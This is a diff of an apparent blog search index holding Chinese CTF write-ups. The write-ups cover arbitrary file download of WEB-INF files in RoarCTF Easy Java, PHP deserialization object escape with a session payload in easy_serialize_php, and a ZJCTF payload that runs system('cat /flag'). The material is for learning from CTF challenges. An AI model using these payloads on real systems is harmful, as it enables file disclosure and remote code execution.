@@ -19,39 +19,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>BUU-[RoarCTF 2019]Easy Java的Wp</title>
-    <url>/CTF/Web/BUU-Easy_Java/</url>
-    <content><![CDATA[<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><strong>WEB-INF是Java的WEB应用的安全目录,此外想在页面访问WEB-INF应用里面的文件,必须要通过web.xml进行相应的映射才能访问</strong></p>
-<blockquote>
-<p>&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则<br>&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在.jar文件中<br>&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件<br>&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</p>
-</blockquote>
-<p><strong>简单来说，java web是基于Tomcat服务器搭建的，通过servlet来开发。狭义来说，servlet是指Java语言实现的一个接口。</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;servlet-class&gt;  这个就是指向我们要注册的servlet 的类地址, 要带包路径</span><br><span class="line">&lt;servlet-mapping&gt;  是用来配置我们注册的组件的访问路径,里面包括两个节点</span><br><span class="line">一个是&lt;servlet-name&gt;，这个要与前面写的servlet一致</span><br><span class="line">另一个是&lt;url-pattern&gt;，配置这个组件的访问路径</span><br><span class="line">&lt;servlet-name&gt; 这个是我们要注册servlet的名字,一般跟Servlet类名有关</span><br><span class="line">举个例子</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">	//servlet包含了路径信息，我们尝试包含一下FlagController所在路径，不过这次要在前面加上classes来访问class文件目录（详见上面的目录结构），且文件后缀为.class</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="解题"><a href="#解题" class="headerlink" title="解题:"></a>解题:</h3><p><img src="/CTF/Web/BUU-Easy_Java/00.png"></p>
-<p>弱口令，在Bp的Intruder模块下破解密码</p>
-<p><img src="/CTF/Web/BUU-Easy_Java/01.png"></p>
-<p>进入之后发现并没有flag -&gt; 注意到login页面下面的help可以点,里面有</p>
-<p><img src="/CTF/Web/BUU-Easy_Java/00.png"></p>
-<blockquote>
-<p><code>java.io.FileNotFoundException</code> 表示在 Java 中尝试打开或读取文件时，未找到指定路径的文件。在你提供的例子中，文件路径是 <code>&#123;help.docx&#125;</code>。</p>
-</blockquote>
-<p>此时可以注意到url中是有这个filename参数的，且前面是Download -&gt; 下面对应的文件呗?</p>
-<p>但是并没有跳转下载链接, -&gt; 看别人的Wp说，将get方法改为post方法就能跳转下载链接了（不知道为什么）</p>
-<p><img src="/CTF/Web/BUU-Easy_Java/03.png"></p>
-<p>下载打开help.docx中并没有flag</p>
-<p><strong>结合题目信息 Java 以及上面的知识点</strong>  访问下载WEB-INF&#x2F;web.xml -&gt; </p>
-<p><img src="/CTF/Web/BUU-Easy_Java/04.png"></p>
-<p>再访问下载WEB-INF&#x2F;classes&#x2F;com&#x2F;vm&#x2F;ctf&#x2F;FlagController.class</p>
-<p>打开之后发现一串base64编码的字符串，解码得到flag.</p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-  </entry>
-  <entry>
     <title>BUU-ZJCTF,不过如此 - Wp</title>
     <url>/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/</url>
     <content><![CDATA[<p><img src="/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/00.png" alt="00"></p>
@@ -99,6 +66,39 @@
 <p>在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)</p>
 </blockquote>
 <p>payload: <code>/?text=data://text/pain,I have a dream&amp;file=next.php&amp;\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);</code></p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>BUU-[RoarCTF 2019]Easy Java的Wp</title>
+    <url>/CTF/Web/BUU-Easy_Java/</url>
+    <content><![CDATA[<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><strong>WEB-INF是Java的WEB应用的安全目录,此外想在页面访问WEB-INF应用里面的文件,必须要通过web.xml进行相应的映射才能访问</strong></p>
+<blockquote>
+<p>&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则<br>&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在.jar文件中<br>&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件<br>&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</p>
+</blockquote>
+<p><strong>简单来说，java web是基于Tomcat服务器搭建的，通过servlet来开发。狭义来说，servlet是指Java语言实现的一个接口。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;servlet-class&gt;  这个就是指向我们要注册的servlet 的类地址, 要带包路径</span><br><span class="line">&lt;servlet-mapping&gt;  是用来配置我们注册的组件的访问路径,里面包括两个节点</span><br><span class="line">一个是&lt;servlet-name&gt;，这个要与前面写的servlet一致</span><br><span class="line">另一个是&lt;url-pattern&gt;，配置这个组件的访问路径</span><br><span class="line">&lt;servlet-name&gt; 这个是我们要注册servlet的名字,一般跟Servlet类名有关</span><br><span class="line">举个例子</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">	//servlet包含了路径信息，我们尝试包含一下FlagController所在路径，不过这次要在前面加上classes来访问class文件目录（详见上面的目录结构），且文件后缀为.class</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="解题"><a href="#解题" class="headerlink" title="解题:"></a>解题:</h3><p><img src="/CTF/Web/BUU-Easy_Java/00.png"></p>
+<p>弱口令，在Bp的Intruder模块下破解密码</p>
+<p><img src="/CTF/Web/BUU-Easy_Java/01.png"></p>
+<p>进入之后发现并没有flag -&gt; 注意到login页面下面的help可以点,里面有</p>
+<p><img src="/CTF/Web/BUU-Easy_Java/00.png"></p>
+<blockquote>
+<p><code>java.io.FileNotFoundException</code> 表示在 Java 中尝试打开或读取文件时，未找到指定路径的文件。在你提供的例子中，文件路径是 <code>&#123;help.docx&#125;</code>。</p>
+</blockquote>
+<p>此时可以注意到url中是有这个filename参数的，且前面是Download -&gt; 下面对应的文件呗?</p>
+<p>但是并没有跳转下载链接, -&gt; 看别人的Wp说，将get方法改为post方法就能跳转下载链接了（不知道为什么）</p>
+<p><img src="/CTF/Web/BUU-Easy_Java/03.png"></p>
+<p>下载打开help.docx中并没有flag</p>
+<p><strong>结合题目信息 Java 以及上面的知识点</strong>  访问下载WEB-INF&#x2F;web.xml -&gt; </p>
+<p><img src="/CTF/Web/BUU-Easy_Java/04.png"></p>
+<p>再访问下载WEB-INF&#x2F;classes&#x2F;com&#x2F;vm&#x2F;ctf&#x2F;FlagController.class</p>
+<p>打开之后发现一串base64编码的字符串，解码得到flag.</p>
 ]]></content>
       <categories>
         <category>Web</category>
@@ -159,6 +159,67 @@
 <p><strong>2.传参为什么要将空格表示为%20（url编码）      直接用空格是不对的。</strong> </p>
 <p>3.php中对于\的输出 -&gt; 可以得到 奇数个报错，偶数个输出一半</p>
 <p><img src="/CTF/Web/BUU-easy_web/05.png" alt="05"></p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>BUU-easy_serialize_php的Wp</title>
+    <url>/CTF/Web/BUU-easy_serialize_php/</url>
+    <content><![CDATA[<blockquote>
+<p>1.代码审计</p>
+<p>2.PHP反序列化</p>
+<p>3.反序列化中的对象逃逸</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>$function 变量 通过GET传f变量得到   &#x3D;&gt; 不同的值，对应不同的页面</p>
+<p> -&gt; 当f传入phpinfo , 可以得到提示 &#x3D;&gt; 一个文件的名字 d0g3_f1ag.php</p>
+<p> -&gt;当f传入show_image的时候存在file_get_contents函数 &#x3D;&gt; 可以读取文件内容</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>filter函数 &#x3D;&gt;过滤函数, 将一系列黑名单替换为空 &#x3D;&gt; 将$img变量中存在黑名单的内容替换为空</p>
+</blockquote>
+<p>-&gt; 以及serialize和unserialize两个序列化函数，想到键值对的逃逸</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="comment">// 以POST方法传入参数 =&gt; extract函数的作用是将post方法传入的键值对，以变量的形式返回</span></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="comment">// 将$_SESSION序列化后进行filter进行过滤，然后赋值给 $serialize_info变量</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>); <span class="comment">// 将$serialize_info变量进行反序列化</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将$userinfo变量数组中img的值进行base64解码后进行文件的读取</span></span><br></pre></td></tr></table></figure>
+
+<p>![]CTF&#x2F;Web&#x2F;BUU-easy_serialize_php&#x2F;test00.png)</p>
+<hr>
+<p><strong>如何去构造一个字符串逃逸</strong></p>
+<hr>
+<p><strong>1.键名逃逸</strong></p>
+<p>如何传入$_SESSION[phpflag] 序列化之后</p>
+<p>-&gt; s:7:”phpflag”:s:48:”” &#x3D;&gt; s:7:”<code>&quot;:s:48:&quot;</code>;”</p>
+<p>-&gt; 48是 传入phpflag的值的长度（即, $img对应的值）</p>
+<p>-&gt; 最后要进行序列化的闭合 <code>;&#125;</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="comment">// s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>结合起来</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;phpflag&#x27;</span>]=<span class="string">&quot;;s:1:\&quot;1\&quot;;s:3:\&quot;img\&quot;;s:20:\&quot;ZDBnM19mMWFnLnBocA==\&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>) );</span><br><span class="line"><span class="comment">// &quot;a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span></span><br><span class="line"><span class="comment">// &quot;a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>逃逸成了 </p>
+<p>“;s:48: 的变量名对应的值为1 </p>
+<p>​	-&gt; 注意的点<code>&quot;;s:</code>肯定有，48:是后面的值的长度</p>
+<p>​	-&gt; 第二个”是传入的值的前引号</p>
+<p>​	-&gt;我们需要自己构造的是闭合这个名字 <code>;</code></p>
+<p>img的变量名对应的值对 base64_encode(d0g3_f1ag.php)</p>
+<p>​	-&gt; 注意的点，闭合这个序列化 ;}</p>
+</blockquote>
+<p><strong>2.键值逃逸</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&quot;flagflagflagflagflagphp&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="string">&quot;;s:3:\&quot;img\&quot;;s:20:\&quot;ZDBnM19mMWFnLnBocA==\&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>) );</span><br><span class="line"><span class="comment">// &quot;a:2:&#123;s:4:&quot;user&quot;;s:23:&quot;flagflagflagflagflagphp&quot;;s:8:&quot;function&quot;;s:40:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>先将自己要写入的代码放进去 也就是$function的值</p>
+<p>-&gt;通过测试，一步步调整 user中的值 来闭合</p>
+</blockquote>
+<p><code>&quot;a:2:&#123;s:4:&quot;user&quot;;s:23:&quot;flagflagflagflagflagphp&quot;;s:8:&quot;function&quot;;s:40:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;&quot;</code></p>
+<p><code>&quot;;s:8:&quot;function&quot;;s:40:&quot;</code> -&gt;这是23的长度，我们传入function中的值，开始要有一个”和; 来闭合前面user的值</p>
+<p><strong>payload:_SESSION[user]&#x3D;flagflagflagflagflagphp&amp;_SESSION[function]&#x3D;”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA&#x3D;&#x3D;”;s:1:”1”;s:1:”2”;}</strong></p>
 ]]></content>
       <categories>
         <category>Web</category>
